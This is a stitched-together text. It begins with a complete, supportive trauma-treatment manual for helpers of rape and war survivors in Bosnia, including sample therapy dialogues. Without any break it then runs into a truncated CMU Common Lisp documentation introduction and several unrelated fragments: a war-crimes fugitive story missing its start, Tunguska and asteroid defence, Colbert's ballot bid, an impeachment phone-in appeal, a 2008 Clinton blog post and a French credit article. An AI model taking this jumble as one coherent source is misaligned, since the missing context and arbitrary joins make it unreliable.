Introductory Note
This manual was originally written for people working in the field with women survivors of rape in Bosnia , but it can be used more broadly as a guide for helping anyone of either gender who has survived any kind of trauma .
Since it is written from afar and based on experiences similar to but not the same as the ones you are dealing with , please use what is useful or helpful and ignore what is irrelevant or wrong for your circumstances , trusting more in your judgment and intuition than in anything contained herein .
Also , please be aware that some of the suggestions and conversations suggested here may not fit the cultural context you will be working in .
It is best to ask local people about what can be discussed in private or in public with any group you are dealing with .
For example , some people in the former Yugoslavia may be unwilling to discuss rape with anyone .
It may be necessary to talk " around " such subjects rather than directly .
Some groups may not be willing to discuss feelings at all .
When in doubt , follow rather than lead .
This manual may be adapted for any purpose the reader feels is appropriate in helping survivors of trauma or those helping them .
It is primarily intended for treating adults .
The manual may be freely distributed .
I 'd appreciate it if my name is kept on it .
My wish is for this to be a living document , kept alive and changing by the feedback I get from those who use it .
Please let me know what works , what does n't , what you 'd like to see changed , removed , or added .
I would also be willing to adapt this manual for different purposes , if there are requests and there is time .

Trauma Treatment Manual
GENERAL GUIDELINES
When people have experienced things they cannot stand , ordinary people can often give them what they need to help them begin to heal .
This section gives general guidelines for working with people who have been catastrophically violated .
What they are suffering
The people you will be working with have experienced events that have permanently changed their lives .
But they can heal .
People who have been raped , who have seen their loved ones killed -- their lives will never be the same again .
Yet no matter how great the horror people have experienced , they may recover emotional functioning , so that they are not feeling pain , terror , shame , fear , or horror all the time .
Rape and murder may have robbed them of a sense of integrity and wholeness , but in time and with your help , they may be able to resume life with their sense of self restored .
People who have experienced rape or torture or who have witnessed murders of loved ones usually suffer from Post Traumatic Stress Disorder , a psychological disorder that occurs when people have experienced life - threatening , shocking events .
It has symptoms that are often the same for different people , regardless of the specific events they suffered .
With Post Traumatic Stress Disorder ( PTSD ) , many normal processes are more intense , while many are deadened .
People whose normal lives have been drastically changed by the sudden intrusion of horrifying and destructive events are experiencing more than they can integrate , and their sense of security and safety is shattered .
In PTSD , some of people 's responses are greatly heightened .
The blow of a severe event has told them that the world is not the safe place they imagined .
So they become ready for danger at all times : they have hyper - vigilance -- greater readiness to flee or fight .
They live in emergency mode , and they have learned not to trust .
At the same time as having heightened responses , they also shut down a great deal , so that many of their normal responses to life and to other people are not accessible to them .
As a result , these are some of the symptoms you might see :
* Intense emotion and reactivity .
People exposed to traumatic events feel intense pain , terror , shame , horror , grief , rage , and shock .
They are activated and alert most of the time , ready to react .
People may be jumpy , looking constantly for danger , and easily startled .
They may have difficulty sleeping or even relaxing .
* Numbness .
When hell suddenly breaks into a life , people become overwhelmed .
They may experience shock and protect themselves through denial , disbelief , and dissociation ( spacing out or splitting away from the terrible events as if they did n't happen to them ) .
They feel numb , feel cut off from other people and from their own feelings , and as if they are no longer really alive .
* Flashbacks .
People who have had terrible things happen to them will often re-experience the events over and over again , against their will .
They will experience their minds invaded by thoughts of the events and will feel tortured by them .
* Nightmares .
Like flashbacks , but these occur in sleep .
As a result some people can be afraid to go to sleep and may develop sleep deprivation .
* Triggering .
Often people will respond to events that remind them of the trauma with all the feelings that belonged to the trauma itself .
Combat soldiers , for example , will respond to loud noises as if it meant incoming mortar ; rape victims may respond to the smell of a man as if he were her rapist .
What they need
Most of all people need to feel realtively safe .
Anyone who has been extremely hurt by other people , especially when they have been systematically tortured has learned not to trust anyone .
This is how they survived .
They will not trust you at first , not for a long time , maybe never .
Moreover , in areas of the world in which brutality , horror , and extreme danger have become commonplace , talking about safety can seem absurd or even offensive .
But you still can help people to feel relatively safer .
All of us know how to do that with people ; we just need to be reminded how : we may begin simply by performing simple acts of kindness , by letting people alone when they want to be let alone , by treating other people as if you cared about them .
Most important for survivors of extreme abuse is that they need to know these things :
* They need to know that you will respect their boundaries .
Trauma , almost by definition , breaches people 's normal boundaries .
It is as if life drives a bulldozer over people 's normal sense of protection , sense of safety , and sense of self .
So people need to know that their wishes matter , that you will not force them to respond in anyway other than what they choose , and that you will not invade them .
* They need to know they can leave if they want to .
People who have experienced prison and torture must know that they are not trapped , that they can get out if they want .
* They will not be touched if they do not want to be .
People who have learned to associate touch with violation often cannot bear to be touched , even in kindness .
Especially when the violation was sexual , they may not be able to tolerate intimacy , even when you mean well .
* They need to feel accepted and not judged .
When people have been violated , they experience a lot of feelings about themselves they cannot stand .
They judge themselves very harshly and can often not even stand the fact that they are alive .
They need those around to accept and affirm them as having value and not as having been " spoiled " or " ruined " by what they have been through , even if that is how they themselves feel .
* People usually need to talk and be listened to .
When people hurt , especially when they hurt more than you can stand to hear , or think about , or feel , it is hard just to listen to people .
But it the most important thing you can do .
* Often people need to have their feelings paid attention to .
When people hurt in ways they cannot stand , they freeze up their feelings .
They just try to survive .
That is nature 's way of helping them to get through what they have to endure .
But afterward they need to get their feelings back , so that they can function again , and so that they do n't have to go through their lives closed down inside .
If they are still numb , you should not push them .
Nature knows when it is time to feel again .
* Sometimes people need to be left alone .
We should never force help on people who have already been forced to do things by other people .
We should help people only when they want help .
Sometimes people are unready to face what has happened to them , or to experience their own feelings , or to talk about what has happened .
It is always important to respect people 's healing process .
Each person needs to heal in her own way in her own time .
Some need to feel , some need to remain numb .
The best approach , when you are uncertain about what a person wants is to ask .
It is always good to ask people 's permission to talk about what happened , to talk about their feelings , or to help them in any way .
It is almost always damaging to people to insist that you know what they need better than they do .
What you can do to help : Your Characteristics
* Your presence is the most important gift you can give .
Many people think that to help severely emotionally wounded people they should have highly specialized medical training , or they should know the right things to say in order to make them feel better .
That is not true .
What is most important to badly hurt people is that they know that you are there and that you care .
It is often remarkably simple what people need .
They need you to be able to be present , focusing your attention on them ; and they need you to be open , listening to them with your heart and your feelings , feeling with them .
* Detachment .
In addition to your compassion , survivors of trauma also need your neutrality .
Many of the events that you hear about may elicit very strong feelings in you -- feelings that are very appropriate .
You may feel angry , sad , grieving , frightened , horrified , shocked , and deeply disturbed .
Sometimes it is helpful to share a little of these feelings , so that people you are working with realize that they are with a human being , and so that you can remind them that it is appropriate to feel .
But for the most part , the goal of individual work is to help people find their own feelings again , and for that they often need your calm , grounded presence rather than a lot of your emotional reactions .
They have already had their space violated by others , now they need their own space to work in , and you can provide that best by making sure that it is their feelings , not yours , that occupy most of the time and space in the room .
What you can do to help : Procedures and Processes
* Begin simply .
Introduce yourself , tell the person you are working with ( we shall call her the survivor from now on , because she has survived some terrible events ) that you are there to help and there to listen .
Do not begin with discussion of the traumatic events unless they initiate that themselves .
Begin by helping the survivor to become comfortable , asking her how she is doing in the present , whether she would like your help , how she would like to you to help , whether she wants to talk to you , what she would like to talk about now . .
The goal in the beginning is to meet and set up an agreement and a space in which hard work can later occur ; it is not necessarily a time to begin that hard work , unless this is the only meeting you will have , or unless you will have very few meetings .
* Let the survivor lead .
Perhaps the simplest and best rule in healing is to trust the other person 's process .
Nature heals , not you , and the person will bring things up in their own way and own time , as they are ready .
It is therefore often best simply to sit in comfortable silence , once initial greetings have taken place and you have let the other person know that they can talk about whatever they want , and wait for them to decide what they want to talk about .
* Ask questions .
Even though it is good to wait , you need not be passive .
Once the other person has begun to talk about events it is good to engage with them , to let them know you are interested and also to help guide the process .
What questions to ask is a matter of judgment and experience .
Basically , it is good to trust your own intuition , instinct , and interest to provide the questions , but below are some further guidelines suggesting how to direct the process .
* Always work with permission .
Never force or pressure a survivor to remember or to feel .
Always ask if they would like to discuss something before leading further .
* As long as the survivor is not overwhelmed and is willing , create space for her to move into discussing more emotionally difficult material .
One goal is to help the survivor to integrate what has happened to her .
You are following nature .
If the person is already having flashbacks and nightmares , part of her mind wants to bring the experience into consciousness and master it , making sense of it , integrating it into her life , so she can go on .
Therefore you will want to help her do that .
Here is an example of how one may work with a survivor by asking questions that permit movement into discussing more emotionally intense material .
Therapist :
What would you like to talk about today ?
Survivor : I 've been having some disturbing thoughts lately .
T : Disturbing thoughts ?
S : Yes .
T : Would you like to talk about those thoughts ?
S : I guess so .
It 's just that the feelings are so disturbing , that I 'm not sure that I want to go into it .
T : I understand that .
The feelings are so strong that it is hard to be willing to talk about these things .
S : Yes .
But I guess I need to talk about it .
It wo n't just go away .
Right ?
If you want to talk about it , I 'm interested in hearing .
You should talk about it only if you are ready .
Let people tell their story .
Generally , people who are healing from horror need to tell their story .
They do n't need you to push them , but they need to know that you are there who cares and want to know and are willing to listen .
Generally , you can convey this through quiet openness and some encouragement to go into the story .
Survivor : I am haunted by nightmares of what happened to me .
Therapist :
Do you want to tell me about the nightmares ?
S : In each dream , I am alone in my house , and I hear noises outside .
I feel absolute terror , just waiting for them to come in .
They come in and I scream .
Sometimes I wake myself up then .
T : It sounds like a lot of terror .
Do these dreams remind you of what happened ?
S : Yes .
T : Do you want to talk about it ?
S : ( Long pause . )
I can't believe what happened .
These people were my neighbors .
My children went to school with their children .... How can people .... They were drunk .
They made so much noise .
I thought the door would break .... There were three of them .
I did n't know what to do .
I wanted to run out of the house , but -- I do n't know what was wrong with me .
I just froze .
One of them said bad things to me .
I knew what was going to happen .
Their eyes .
They looked like dogs , when they attack .
I could n't breathe .
* Allow the experience and expression of feeling .
In general , within the guidelines above it is helpful for people to experience and express the feelings they have about what they have endured .
The feelings that may emerge are fear , terror , shock , horror , anger , rage , grief , sadness , disgust , and shame .
Each of these feelings is a legitimate and understandable response to the experiences survivors have had .
Being able to re-experience and express these feelings in the context of a trusting relationship with you can help them to overcome the mistrust , isolation , and damaged relationships that experiencing rape and torture , and witnessing murder inevitably bring .
Many times you may find yourself very uncomfortable with the intensity of feelings that a survivor has .
You may wish to make the person wrong for having those feelings by denying the reality of their experience or by telling them they should not feel as they do .
Or you may want to try to make them feel better , to spare both them and yourself the rawness of their feelings .
It is almost always wrong to tell someone they should not feel as they do .
It is often not helpful to try to make someone feel better before fully registering , accepting , and mirroring the feeling as it is .
It is generally best just to accept the feelings as they emerge , realizing that is probably the best you can do for their healing .
Some specific techniques are helpful in working with feelings :
* Ask the survivor what she feels .
Sometimes hearing the story is enough .
Other times , it is helpful to elicit the feeling .
For example ,
S : Every day they came in and did the same thing .
( Speaks in monotone , without apparent feeling . )
T : What are you feeling ?
Survivor : I feel terrible about myself now .
I do n't see any point in living .
Therapist : Why ?
Why is it that you do n't see any point in living ?
S : I 'm ruined .
They spoiled me .
I can never be the same again .
T : You feel ruined .
[ Notice that the therapist is not agreeing with the client 's self - assessment , but is re-framing ( changing the meaning ) of the client 's statement by pointing out that it is a feeling , not necessarily a reality . ]
S : Yes .
I feel dirty .
T : What they did to you made you feel terrible about yourself .
S : ( Starts to cry . )
I feel so ashamed .
( Cries freely . )
T : When people have been violated as you have , it makes them feel a lot of shame .
[ This tells the client that it is natural to feel as she does , and it is not her fault that she feels this way . ]
* Reflect what you hear and see .
Telling the survivor how she comes across to you can sometimes help her focus on how she feels .
Example ,
Survivor : I 've . been thinking about going back to my village .
Therapist : I notice you look a little frightened .
S : I am .
I do n't know if there is any chance I ever can go back .
What is to keep the same thing from happening again .
If I could n't trust my neighbors before , how can I now ?
* Do not push for catharsis .
People in shock do not always benefit from strong expression of emotion .
Shock is a state in which functions get frozen and knotted .
Sometimes , a spontaneous expression of feeling helps to thaw the freeze .
Other times it is better to let the system unfreeze gradually and gently , letting the " knots " in the nervous system unwind slowly .
While cathartic experience can help , repeated experiences of powerful emotion , especially when pushed by someone else , can sometimes be retraumatizing and reinforce the traumatic state .
* Focusing on body sensations helps the nervous system to unwind from trauma .
In trauma , people get stuck in the past .
They need to move carefully out of being stuck .
You can assist this by helping people follow their own inner sensations .
Survivor : I do n't think I can stand how I feel .
Therapist :
What are you feeling ?
S : I do n't know .
I just know I can't stand it .
T : What do you notice going on in your body ?
S : I do n't notice anything .
T : Nothing .
S : I feel like I 'm not even in my body .
T : Yes .
Where are you ?
S : Up there ( points to ceiling ) .
( Survivor is indicating she is dissociated . )
T : Good .
What do you notice about your body from up there ?
( Begins to reintroduce the body back into consciousness . )
S : It 's tense .
T : Where do you notice the tension ?
S : In the shoulders .
And the chest .
T : OK , good .
( Saying " good " or " fine " lets the client know implicitly that she is on the right track , no matter what she reports ; that she only needs to say what is there , and that whatever is there is fine . )
So you 're tense in the shoulders and chest .
Anywhere else ?
S : Yes , my stomach is tight .
T : Good .
So let 's see what happens if you pay attention to your shoulders and chest and arms being tight .
Just notice that for awhile .
S : ( Long silence .
This kind of work is a very slow process .
Do n't worry if it takes a long time for anything to seem as if it is happening . )
( Takes a deep breath )
My stomach is starting to loosen a little bit .
( Survivor is starting to unwind a little .
This is good ; in this kind of work , we do n't need drama to be effective . )
* If the person seems overwhelmed , lead away from emotionally painful material .
It is important to monitor the survivor , to make sure that the feelings and experiences that are arising are not overwhelming to the survivor in the present .
" Overwhelming " is not the same as intense .
Overwhelming means that the person simply cannot take in the experience now .
Signs that the person is feeling overwhelmed are the following :
* The person experiences herself leaving her body .
This is a symptom of dissociation and a sign that the person 's nervous system cannot deal with the overload of sensation .
*
The person loses the ability to communicate .
Sometimes people will become quiet when absorbed in the memory of an experience .
That is often a sign of healing .
Other times , however , they may find themselves unable to talk , speaking very haltingly , etc .
This may be a sign that the person is feeling overwhelmed .
If you are unsure about whether the client is handling the silence productively or is feeling overwhelmed , ask her what is happening .
*
The survivor seems " spacey , " that is , the eyes become glazed , they seem " not there , " or somehow seem to be far away .
This is another sign of dissociation .
*
The person experiences perceptual distortions .
Her body might feel like cotton , her visual field may narrow severely , she may feel cold and numb or unable to move parts of her body , or she may feel cut off from her surroundings .
If these signs and symptoms are present , or if you have other reasons to believe that the survivor is feeling more sensation and feeling than she can handle ( not more than you can handle , more than she can handle ) , then lead the discussion back into the present .
Here are examples of leading back to the present .
Notice how in this example , body sensation is used to " ground " the person , that is bring her back into present time and in this place , away from the past trauma .
S : Then this man came and got .... I 'm feeling strange now .
I do n't think I can go on with this .
T : You 're feeling strange .
[ Focusing on present feeling is sometimes a beginning point of getting someone back to the present , without being too abrupt . ]
S : Yes .
My head feels kind of funny T : Pay attention to that now .
Notice the sensations in your head .
[
Focusing on present bodily sensations is the best way of bringing someone into present reality and away from overwhelm .
It brings her " back into her body . " ]
S : I feel kind of dizzy .
T : What else do you notice going on in your body ?
[ Moving away from the overwhelm in the head , moving to lower parts of the body can be " grounding , " that is helping the person " root " in present time with both feet on the ground . ]
S : I feel kind of sick to my stomach .
T : Pay attention to that feeling .
Notice the sensations .
[ Here you are showing the person she does not have to be afraid of sensations that may have seemed overwhelming a few minutes ago . ]
S : I feel nauseous .
T : Stay with that for awhile and see what happens .
S : My jaw feels tight .
T : What happens if you stay with that sensation ?
S : I feel a softening happening in my arms .
T : Go with that : stay with that sensation for awhile .
( Survivor is encouraged to experience the " letting go " into healing .
Softening , melting , lightening sensations can be signs that the survivor is letting go and experiencing relief and healing . )
* Enhancing the feeling of safety is another way to reduce overwhelm and allow integration of difficult material .
If the person remains persistently overwhelmed but still wishes to go through her story , there is a way to help people to integrate difficult material more easily and safely .
In the first part of the technique , the therapist asks the survivor to imagine in her mind a safe place .
It can be a real or imaginary scene .
It can be a place in nature or indoors .
In war zones , nature may not be appropriate to imagine as a safe place , due to the high density of landminds and other dangers .
Sometimes people who have suffered severe trauma will say they cannot think of anyplace safe .
Then it is best to ask them to think of the safest place they can .
Then the therapist asks the survivor to imagine being in the safe place , perhaps with someone whom they trust with them there too .
After the person imagines herself there and is feeling somewhat secure , the therapist asks the survivor to leave the safe place and go back to the traumatic incident in her imagination .
She is to remain with the traumatic memory , describing it to the therapist until she feels overwhelmed by feeling ; at that point , she is to return to the safe place and discuss the incident with the trusted friend in the safe place .
By alternating back and forth between the safe place and the trauma , people can more easily integrate the memories of trauma and also the powerful feelings the trauma has generated .
Here is an example of the use of this " safe place " technique .
Therapist : Would you like to try something that might make this process easier ?
Survivor :
What is it ?
T : It involves imagining a safe place .
S : All right .
T : We will be going back and forth between a safe place and the camp where all the terrible things happened to you .
Are you willing to do that ?
S : All right .
T : I would like you to close your eyes and imagine a safe place .
It might be a real place or an imaginary place .
It could be in a house you know , or it could be in the mountains or in a field or wherever you feel safest .
Would you do that now ?
S : ( After a minute of trying , cries . )
There is n't any place safe any more .
T : I understand that .
Could you imagine the safest place that you can think of .
S : All right .
I am in my aunt 's house .
In her front room .
I always felt safe there .
T : Is your aunt there ?
S : Yes .
I always trusted her .
She was very nice to me .
My mother used to leave me there on weekends , when she went to the city .
T : Good .
So now I would like you to go to the safe place for awhile and spend a little time there .
S : ( Is silent for a minute or two . )
T : How are you doing ?
S : Fine .
T : Good .
Now I am going to ask you in a minute to leave the safe place and go to the camp .
When you do that , I 'll ask you to tell me what you are experiencing .
And then as soon as you feel overwhelmed , like the feelings are too much , or that you start feeling like you are leaving your body or loosing touch with yourself , I will ask you to run back to the safe place .
OK ?
S : Yes .
T : All right .
I want you to leave your aunt 's house now and go to the camp .
.... What do you see there ?
S : I see my room .
T : What is it like ?
What do you notice ?
S : It seems all grey to me .
I see my clothes hanging on the door .
And I notice the door knob ....
I am starting to feel frozen in my body .
... I ... I ... ( Stops talking . )
T : I 'd like you to run back to the safe place now .
Will you do that please ?
S : ( Pauses , then breathes deeply . )
I am with my aunt now .
T : Tell your aunt what you just experienced .
S : ( Silent for half a minute , then begins to cry . )
I am telling her about what the men did to me ...
( Sometimes it is easier for the survivor to " tell " someone in her mind than someone outside herself . )
* Help people recognize and develop their resources .
In the midst of trauma , it is sometimes hard to remember that people 's lives are about more than their trauma and that their spirit is often greater than what has befallen them .
In even the worst of circumstances , there are opportunities to grow beyond the obstacles that beset people .
It is helpful to survivors to have their resources recognized .
Some resources are inner ones .
Survivor : I spent time with a friend this morning .
She was grieving over the loss of her baby .
Therapist :
What did you do with her ?
S : I just spent time with her and I held her while she cried .
T : It amazes me that after all you 've been through you can still be there for someone else .
Or :
Survivor : I am feeling a lot of despair today .
I just do n't know how I can go on with my life .
Therapist : Yes , I can understand your despair .
You 've lost so much , and life looks like it is not presenting any hopeful possibilities for the future .
How is it that you have been able to go on this far ?
How have you been able to do it ?
S : I do n't know how I 've done it .
I guess I was always that way .
I always went on no matter what .
My mother was like that too .
She grew up in a family where a lot of her brothers and sisters died .
Somehow , she had the strength to keep going .
T : It seems that maybe you have a lot of that kind of strength too .
S : Yes .
But I 'm not sure it is going to be enough to deal with all this .
T : Right .
This seems too much to deal with sometimes is n't it ?
S : It feels that way ..... I do n't know .
I hope I 'll have the strength .
My children need me .
Sometimes the resources to be recognized and developed are external ones .
Trauma disrupts life , and re-building life usually requires support .
Help the survivor recognize and develop support of all kinds in her life : friendship , medical help , housing , whatever is needed .
* Avoid pushing for recovery too soon .
In most cultures , there is a conventional tendency to respond to other people 's traumas and sometimes one 's own by saying clichés like , " You just have to keep on going , " " That was in the past , there 's no sense in dwelling on it , " " I just try not to think about it , you should too , " etc .
But trauma freezes people into the past , and it robs them of a sense of future .
Such clichés , though useful for some , are often hurtful for those who are not yet ready or able to move on .
It is important to remain patient with the healing process , reassuring people that healing takes time .
And healing from trauma usually takes more time than anyone likes .
* Take care of yourself .
Last but definitely not least , make sure you have support and that you do not overextend yourself .
Secondary PTSD is a real phenomenon .
You can be traumatized by exposure to other people 's traumatic stories , energy , and emotions .
Do n't let your life be overwhelmed by others ' traumas , and be sure to get plenty of support and help for the feelings that come up for you in working with other peoples ' traumas .
If you have had traumas in your own life that you are not finished dealing with -- and most of us do -- then you can expect that the memories and issues and feelings associated with them will be retriggered by working with other peoples ' traumas .
Get help sooner rather than later in dealing with whatever comes up for you .
It can be a great opportunity and lead to greater health and healing for you as well as the people you are helping !
Summary
Survivors need a chance to express themselves and work with their experience in the context of a relationship they can come to trust .
This will help them to restore their trust in others and in themselves and also to begin coming to terms with their experience .
In this process , it is helpful to give them lots of room to talk or not to talk , to remember or not to remember , to feel or not to feel , to express or not to express .
It helps to let the survivor lead the way , to ask questions , to reflect feelings , to mirror what you see and hear .
In general , it is helpful to encourage expression of their experience , feeling , and sensation , as long as they are not overwhelmed in doing so .
It is best for them to absorb their experience a bit at a time rather than all at once .
It also helps to get people to understand that how they feel is normal and a result of what have happened to them .
It helps to give them confidence that they can live with their feelings and experiences and patiently deal with the intensity of feelings they have to absorb .
Most important , it helps for you just to be present , without judgment , trusting in their healing process and your own instinct and intuition .
When people are wounded in war , they heal .
The same can be true of emotional wounds .
With our help and with time , people may heal from the worst of experiences .

The EncyCMUCLopedia
A CMU Common Lisp Documentation Collection
Milano , Italy -- Mar 29 , 2001 -- 16:17 CEST
Paolo Amoroso ( editor ) , amoroso@mclink.it
Revision history
Contents
In this section you will find information about the purpose of the EncyCMUCLopedia , its availability and structure , its copyright and licensing status , and how to provide feedback to the editor .
This is the EncyCMUCLopedia , an extensive collection of documents concerning CMU Common Lisp ( CMU CL ; a more complete and up to date site is maintained by Eric Marsden ) .
CMU CL is a free , high - quality ANSI Common Lisp system for Unix workstations originally developed at the School of Computer Science at Carnegie Mellon University .
The EncyCMUCLopedia is intended as a resource for both users and implementors .
Its purpose is to package and present all useful material directly related to CMU CL .
The EncyCMUCLopedia does not contain , however , references to introductory Common Lisp material , for which you may check the Web site of the Association of Lisp Users ( ALU ) .
It is not a tutorial or reference guide to CMU CL either .
The documents included here were written at different times by different authors , mostly CMU CL developers .
The information they contain may be incomplete , incorrect or out of date .
It is your responsibility to check its accuracy .
As the editor of the EncyCMUCLopedia I look for interesting material , organize it , add appropriate comments and cross references to an index , and package the collection for distribution .
See below for information on how documents are selected and organized .
All material written in the context of the CMU CL project , and the EncyCMUCLopedia as an aggregation of content , comes with the following lack of warranty :
This software is distributed in the hope that it will be useful , but WITHOUT ANY WARRANTY .
The author(s ) do not accept responsibility to anyone for the consequences of using it or for whether it serves any particular purpose or works at all .
No warranty is made about the software or its performance .
This software is made available AS IS , and is distributed without warranty of any kind , either expressed or implied .
In no event will the author (s ) or their institutions be liable to you for damages , including lost profits , lost monies , or other special , incidental or consequential damages arising out of or in connection with the use or inability to use ( including but not limited to loss of data or data being rendered inaccurate or losses sustained by third parties or a failure of the program to operate as documented ) the program , even if you have been advised of the possibility of such damages , or for any claim by any other party , whether in an action of contract , negligence , or other tortious action .
For documents prepared in other contexts each entry contains appropriate copyright , lack of warranty and licensing information .
Check these conditions before redistributing part or all of this collection , or before preparing derivative works .
[ Contents ]
The EncyCMUCLopedia packages in a single collection most of the existing documentation on CMU CL .
It also comes with a sort of annotated bibliography , the page you are reading now , with comments and links to the actual documents .
The distribution of the EncyCMUCLopedia is available at :
encycmuclopedia-yyyymmdd[d].tar.gz encycmuclopedia-yyyymmdd[d].tar.bz2

bzip2
To install the EncyCMUCLopedia you need about 10 MB of disk space .
Just extract the compressed archive in a suitable directory such as / usr / local / lib / cmucl .
Then open file index.html in doc , the top - level directory of the distribution , with any Web browser .
[ Contents ]
This collection includes material directly related to the CMU CL system , its development environment , language extensions and libraries .
Since CMU CL is mostly compliant with ANSI Common Lisp , general and introductory Common Lisp and CLOS documents have been left out from the EncyCMUCLopedia .
Any Common Lisp or CLOS book is a good source of information about standard language features .
If you are interested in such material , check the Web site of the Association of Lisp Users ( ALU ) or download the CMU CL distribution for Debian Linux , which comes with Common Lisp and CLOS tutorials .
The documents in the EncyCMUCLopedia come from different sources and may be incomplete , inaccurate or out of date .
They may also not cover all the features of the system and its use .
Therefore , their grouping in the following sections reflects the state of available material , not a comprehensive and accurate classification of CMU CL 's features .
In other words , if a topic is not mentioned in the EncyCMUCLopedia , there 's probably no documentation about it .
Documents are listed in entries similar to the following sample one :

[ Contents ]
It is not necessary to read all the material referenced in the EncyCMUCLopedia .
Users are often interested in quickly accessing the documentation that may help them in solving particular problems with CMU CL , or in using the system and its tools to perform various tasks .
So the following subsections are structured around typical goal - based user profiles .
Read their introductions to see whether they match the tasks you are interested in .
If so , follow the suggested steps .
The paths are ordered so that background material , and other important or relevant information , is given first .
If you find what you need before the end of a path you may safely skip the remaining entries .
Regardless of the user 's goals , the CMU Common Lisp User 's Manual should probably be a required reading for everybody .
If you are a Common Lisp programmer who needs to become familiar with CMU CL , or you are new to the language and need to install and use the system , this reading path is for you .
You may stop at step 4 if you would just like to learn more about CMU CL in order to decide whether it's the right system for you .
Here is what you may do :

He fled Croatia in 2004 , when the Simon Wiesenthal Centre tracked him down , and has been living in Klagenfurt ever since .
Despite demands for extradition on behalf of Croatia , Austrian authorities have first claimed that he was an Austrian citizen , but when it emerged that he had , in fact , been stripped of his Austrian citizenship , authorities claimed he was unfit for trial .
A group of scientists , joined by a member of Congress , used the 100th anniversary of the Tunguska asteroid event this week to draw attention to their belief that the United States is not doing enough to defend the planet against the dangers posed by near - Earth objects .
“ We are not prepared at this time to prevent the massive death and destruction that would occur if an object from space hit the Earth as it did in Tunguska , ” said Rep. Dana Rohrabacher ( R - Huntington Beach ) at a news conference at the Pasadena offices of the Planetary Society .
If an asteroid the size of the one believed to have exploded in the air above Tunguska , in Siberia , were to explode over Los Angeles , he said , the destruction would range over an area from Catalina Island to San Bernardino .
Although no one is positive what caused the Tunguska event , which flattened trees over an 800 - square - mile area on June 30 , 1908 , most scientists believe an asteroid about 150 feet across exploded above the remote river valley in eastern Russia .
No one was killed .

NASA has established a Near - Earth Object Program Office at the Jet Propulsion Laboratory in La Canada Flintridge to monitor potentially dangerous asteroids .
The most scrutinized is Apophis , which has about a one - in - 45,000 chance of hitting Earth in 2036 , according to Don Yeomans , manager of the Near - Earth Object Program Office .
Apophis is about five times the suspected size of the Tunguska object .
But Alan Harris , a senior research scientist at the Space Science Institute in Boulder , Colo. , said the greatest danger does not come from the objects we know about but from the ones we have n’t identified .
In one example of the lack of attention the issue is receiving in Washington , Rohrabacher said , funding for the Arecibo , Puerto Rico , radio telescope , which hunts near - Earth objects , is in danger in next year ’s budget .
If scientists are able to identify a potential killer asteroid , the deeper question is how to deflect it .
Theorists have proposed a variety of possible solutions , including using a nuclear weapon to blow it up or sending a spacecraft that would use gravity to drag the object off its destructive path .

WASHINGTON ( Reuters ) -
It may be the shortest U.S. 2008 presidential campaign yet -- comedian Stephen Colbert ’s requests to be on the South Carolina Democratic and Republican primary ballots were rejected on Thursday .
Colbert , who has admitted he does not want to be president but just wanted to run for it in his native state of South Carolina , had filed for the Democratic ticket earlier on Thursday and paid the $ 2,500 filing fee .
Hours later , the party ’s executive council voted 13 - 3 against allowing him on the ballot for the January 26 primary contest , party spokeswoman Keiana Page told Reuters .
The eight other major Democratic candidates were accepted , she said .
“ Those candidates who were rejected will receive their checks back , ” she said , adding that a variety of reasons can keep a candidate off the ballot including whether they are a nationally recognized candidate and the individual is actively campaigning in the state .
Colbert also failed to qualify for the Republican January 19 primary ballot .
He was required to file papers with the state party as well as the Federal Election Commission and pay a $ 35,000 fee , but that did not occur by Thursday ’s deadline , according to a party official .
A spokeswoman for the host of Comedy Central ’s “ The Colbert Report ” declined to comment .
Colbert , whose pugnacious egomaniacal television persona routinely mocks conservative talk shows , said he had hoped to run in both South Carolina primaries “ because I ’d like to lose twice . ”
Do you want Impeachment ?
CALL THE MEDIA TODAY !!
Congressperson Dennis Kucinich will be giving a presentation during the Congressional Judiciary Committee being held tomorrow , Friday July 25th 2008 , scheduled to start at 10:00 AM EST ..
Discussing abuse of Executive power .
In the below videos of his recent Alex Jones ’ interview , Dennis Kucinich answered the question of the media refusing to report on Impeachment by asking us to contact the news media and insist they properly cover the event .
http://dandelionsalad.wordpress.com/2008/07/24/dennis-kucinich-the-lions-den/
The failure of the media to cover such an important subject as Impeachment is unprecedented in American history .
It shows that the U.S. corporate - controlled mainstream media believe it has the right to deny the American people news that is highly important to them .
This cannot stand , and if we let them know it is being noticed , will not stand .
Congressperson Kucinich has specifically requested this : Considering all he has done and continues to do for us , perhaps that is not too much to ask …
Contact the major news organizations and INSIST they fully cover and report on the Judiciary hearings tomorrow .
If enough of us do , they will not dare ignore it as they currently plan to do ; and as they have all other Impeachment news to date .
Calling is more immediate and will make the most effect in this very time - sensItive event :
ABC News : 212-456-7777
CBS News : 212-975-4321
CNN : 404-827-1500
Fox News Channel : ( 212 ) 301-3000
NBC : 212-664-4444
MSNBC : ( 201 ) 583-5000

Tom Edsall is reporting that tomorrow night may be the end of the Clinton campaign :
Hillary Clinton has summoned top donors and backers to attend her New York speech tomorrow night in an unusual move that is being widely interpreted to mean she plans to suspend her campaign and endorse Barack Obama .
Obama and Clinton spoke Sunday night and agreed that their staffs should begin negotiations over post - primary activities , according to reliable sources .
In addition to seeking Obama 's help in raising money to pay off some $ 20 million - plus in debts , Clinton is known to want Obama to assist black officials who endorsed her and who are now taking constituent heat , including , in some cases , primary challenges from pro-Obama politicians .
Ben Smith first reported that the Clinton campaign is " shedding staff , " but then reported that " Clinton spokesman Mo Elleithee says the advance staffers have n't been let go or told to find other jobs , just sent home .
They are n't typically paid for off days .
' We just have n't figured out our schedule past Tuesday , ' he said . "
And Marc Ambinder reports that Clinton staffers are being urged to quickly turn in their expense receipts .
All of this is consistent with what I heard last week , that some staffers who had been hopscotching from state to state were being told to not expect to be redeployed to a new state .
It 's too bad Dick Cheney so abused the term , because all these maneuvers look like the actions of a campaign in the last throes .
Maybe , maybe we will finally all be able to focus exclusively on beating McCain and racking up the huge Congressional majorities we want so President Obama will be able to get us out of Iraq , pass a national health care plan , fix the damage of eight years of misrule by Bush , and steer our country in a new direction that ameliorates poverty and inequality , expands opportunity , brings about a safer world , and creates an environmentally sustainable future .
Whether that happens depends on Obama , it depends on those of us who will be counted on to work hard for November , and it depends on Hillary Clinton , for as Rahm Emanuel said a few months ago :
Crédit en ligne en Belgique :
Ce que vous devez savoir !
Le crédit bancaire fait désormais partie du quotidien des Belges : un petit prêt par -ci , par - là pour payer ses factures , réparer sa voiture ou acquérir la maison de ses rêves .
Mais il faut avouer que comprendre le système bancaire n’a jamais été facile , et ce n’est pas mieux quand il s’agit de prêt .
